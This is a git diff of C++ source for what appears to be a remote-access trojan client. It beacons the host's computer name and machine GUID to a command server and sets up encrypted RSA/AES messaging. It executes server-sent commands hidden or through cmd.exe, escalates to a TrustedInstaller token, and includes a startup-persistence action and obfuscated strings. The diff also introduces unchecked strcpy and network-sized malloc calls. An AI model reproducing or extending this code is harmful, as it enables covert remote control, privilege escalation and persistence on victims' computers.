@@ -102,11 +102,9 @@ bool Client::Connect() {
     RSAKeys keys = LGCrypto::GenerateRSAPair(4096);
     this->SetRequestSecrets(keys);
 
-    if ( !ExchangePublicKeys() || !SendComputerNameToServer() || !SendMachineGUIDToServer() )
+    if ( !ExchangeCryptoKeys() || !SendComputerNameToServer() || !SendMachineGUIDToServer() )
         return false;
    
-    this->m_AESKey.key = LGCrypto::Generate256AESKey();
-
     return true;
 }
 
@@ -191,7 +189,8 @@ bool Client::SendMachineGUIDToServer() {
 
 const CMDDESC Client::CreateCommandDescription(const Packet& command) {
     std::string buffer(command.buffer, command.buffLen);
-    
+    CLIENT_DBG(buffer.c_str());
+
     CMDDESC description;
     description.respondToServer = ( command.flags & RESPOND_WITH_STATUS );
     description.creationFlags   = ( command.flags & NO_CONSOLE ) ? CREATE_NO_WINDOW : CREATE_NEW_CONSOLE;
@@ -200,10 +199,11 @@ const CMDDESC Client::CreateCommandDescription(const Packet& command) {
     if ( command.flags & RUN_AS_HIGHEST && this->m_ProcMgr.GetProcessSecurityContext() < SecurityContext::Highest )
         this->m_ProcMgr.GetTrustedInstallerToken();
 
-    if ( command.flags & USE_CLI ) { 
-        description.application = std::wstring(HIDE(L"C:\\Windows\\System32\\cmd.exe")); // use cmd.exe
+    if ( command.flags & USE_CLI ) {
+        description.useCLI = true;
         description.commandArgs += std::wstring(buffer.begin(), buffer.end()); // buffer are the command line args
-    }
+    } else
+        description.application += std::wstring(buffer.begin(), buffer.end());
 
     description.creationContext = this->m_ProcMgr.GetToken();
 
@@ -213,7 +213,7 @@ const CMDDESC Client::CreateCommandDescription(const Packet& command) {
 BOOL Client::PerformCommand(const Packet& command, ClientResponse& outResponse) {
     BOOL    success     = FALSE;
     CMDDESC description = CreateCommandDescription(command);
-    char*   cmdOut = new char; // output of system()
+    std::string cmdOutput;
 
     switch ( command.action ) {
     case RemoteAction::kAddToStartup:
@@ -234,30 +234,28 @@ BOOL Client::PerformCommand(const Packet& command, ClientResponse& outResponse) 
 
         break;
     case RemoteAction::kOpenRemoteProcess:
-
-        success = this->m_ProcMgr.OpenProcessAsImposter(
-            description.creationContext,
-            LOGON_WITH_PROFILE,
-            description.application.data(),
+        this->m_ProcMgr.OpenProcessAsImposter(
+            this->m_ProcMgr.GetToken(),
+            NULL,
+            ( description.useCLI ) ? nullptr : description.application.data(),
             description.commandArgs.data(),
             description.creationFlags,
             NULL,
             NULL,
             description.respondToServer,
-            cmdOut
+            cmdOutput
         );
 
         break;
     }
 
-    if ( description.respondToServer ) {
+    if ( description.respondToServer || command.flags & RESPOND_WITH_STATUS ) {
         outResponse.actionPerformed = command.action;
         outResponse.responseCode = (success == TRUE) ? ClientResponseCode::kResponseOk : ClientResponseCode::kResponseError;
-        memcpy_s(outResponse.buffer, strlen(outResponse.buffer), cmdOut, strlen(cmdOut) );
-        outResponse.buffLen = strlen(outResponse.buffer);
+        outResponse.buffLen = cmdOutput.size();
+        strcpy(outResponse.buffer, cmdOutput.c_str());
     }
 
-    delete cmdOut;
 
     return success;
 }
@@ -272,17 +270,19 @@ bool Client::IsServerAwaitingResponse(const Packet& commandPerformed) {
     return sendResponse;
 }
 
-Packet Client::OnEncryptedPacket(BYTESTRING encrypted) {
-    BYTESTRING decrypted    = LGCrypto::RSADecrypt(encrypted, this->m_RequestSecrets.priv, TRUE); 
-    if ( !LGCrypto::GoodDecrypt(decrypted) )
-        return {};
+Packet Client::OnEncryptedPacket(BYTESTRING received) {
+    //BYTESTRING iv(received.end() - IV_SIZE, received.end());
+    //BYTESTRING encrypted(received.begin(), received.end() - IV_SIZE); // received without iv
+    //BYTESTRING decrypted = LGCrypto::AESDecrypt(encrypted, this->m_AESKey, iv);
 
-    return Serialization::DeserializeToStruct<Packet>(decrypted);;
+    //return Serialization::DeserializeToStruct<Packet>(decrypted);;
+    return LGCrypto::DecryptToStruct<Packet>(received, this->m_AESKey);
 }
 
 void Client::ListenForServerCommands() {
-    BOOL received = FALSE;
-    while ( TRUE ) {
+    bool received = false;
+
+    while ( true ) {
         BYTESTRING encrypted;
 
         received = m_NetworkManager.ReceiveData(
@@ -302,34 +302,53 @@ void Client::ListenForServerCommands() {
         ClientResponse responseToServer;
         
         if ( receivedPacket.action == kKeepAlive ) {
+            CLIENT_DBG("got a keep alive packet, return it.");
             // echo keep alive
-            m_NetworkManager.TransmitData(receivedPacket, this->m_TCPSocket, TCP, NULL_ADDR, true, this->m_ServerPublicKey, false);
+            m_NetworkManager.TransmitData(encrypted, this->m_TCPSocket, TCP);
             continue;
         } else if ( receivedPacket.action == kKillClient ) {
             this->Disconnect();
             break;
         }
 
-        if ( receivedPacket.flags & PACKET_IS_A_COMMAND ) {
+        if ( receivedPacket.flags & PACKET_IS_A_COMMAND )
             PerformCommand(receivedPacket, responseToServer);
-        }
 
         // dont need to respond to server with 'responseToServer'
         if ( ( receivedPacket.flags & RESPOND_WITH_STATUS ) == FALSE )
             continue;
 
-        // respond to server with 'responseToServer'
-        m_NetworkManager.TransmitData(responseToServer, this->m_TCPSocket, TCP, NULL_ADDR, true, this->m_ServerPublicKey, false);
+        BYTESTRING buffer = LGCrypto::EncryptStruct(responseToServer, this->m_AESKey, LGCrypto::GenerateAESIV());
+        m_NetworkManager.TransmitData(buffer, this->m_TCPSocket, TCP);
     }
 }
 
 // todo: add some error handling
-bool Client::ExchangePublicKeys() {
+bool Client::ExchangeCryptoKeys() {
+
+    // receive the public key length
+    unsigned char* derServerPubKey = NULL;
+    int            derServerPubKeyLen = 0;
+    int received = Receive(this->m_TCPSocket, ( char* ) &derServerPubKeyLen, sizeof(derServerPubKeyLen), 0);
+    if ( received <= 0 )
+        return false;
+
+    // allocate the size of the key in memory for a buffer
+    derServerPubKey = ( unsigned char* ) malloc(derServerPubKeyLen);
+
+    // receive the der format of the servers public rsa key
+    received = Receive(this->m_TCPSocket, ( char* ) derServerPubKey, derServerPubKeyLen, 0);
+    if ( received <= 0 ) {
+        free(derServerPubKey);
+        return false;
+    }
+
     unsigned char* derClientPubKey = NULL;
     int            derClientPubKeyLen = i2d_RSAPublicKey(this->m_RequestSecrets.pub, nullptr);
 
     if ( derClientPubKeyLen < 0 )
         return false;
+
 
     // convert RSA* to unsigned char*, this function already mallocs 
     // derClientPubKey for us
@@ -349,26 +368,6 @@ bool Client::ExchangePublicKeys() {
         return false;
     }
 
-    // now receive the public key length
-    unsigned char* derServerPubKey = NULL;
-    int            derServerPubKeyLen = 0;
-    int received = Receive(this->m_TCPSocket, ( char* ) &derServerPubKeyLen, sizeof(derServerPubKeyLen), 0);
-    if ( received <= 0 ) {
-        free(derClientPubKey);
-        return false;
-    }
-
-    // allocate the size of the key in memory for a buffer
-    derServerPubKey = (unsigned char*)malloc(derServerPubKeyLen);
-    
-    // receive the der format of the servers public rsa key
-    received = Receive(this->m_TCPSocket, ( char* ) derServerPubKey, derServerPubKeyLen, 0);
-    if ( received <= 0 ) {
-        free(derClientPubKey);
-        free(derServerPubKey);
-        return false;
-    }
-
     const unsigned char* constDerServerPubKey = derServerPubKey;
     
     // convert unsigned char* der rsa key to RSA* object
@@ -380,9 +379,20 @@ bool Client::ExchangePublicKeys() {
     }
 
     this->m_ServerPublicKey = rsaServerPubKey;
-        
+    
+    // get the aes key generated for this client on the server
+    BYTESTRING encryptedEncodedAES;
+    m_NetworkManager.ReceiveData(encryptedEncodedAES, this->m_TCPSocket, TCP);
+
+    BYTESTRING  decryptedEncodedAES = LGCrypto::RSADecrypt(encryptedEncodedAES, this->m_RequestSecrets.priv, TRUE);
+    std::string base64EncodedAES = Serialization::BytestringToString(decryptedEncodedAES);
+    std::string decodedAES;
+    macaron::Base64::Decode(base64EncodedAES, decodedAES);
+    this->m_AESKey = Serialization::SerializeString(decodedAES);
+
     free(derClientPubKey);
     free(derServerPubKey);
+
     return true;
 }
 
@@ -431,6 +441,7 @@ Client::Client(SOCKET tcp, sockaddr_in addr)
     std::mt19937 rng(gen());
     std::uniform_int_distribution<std::mt19937::result_type> dist(1, 100000);
     this->ClientUID = dist(rng);
+    this->Alive = TRUE;
 }
 
 void Client::Disconnect() {
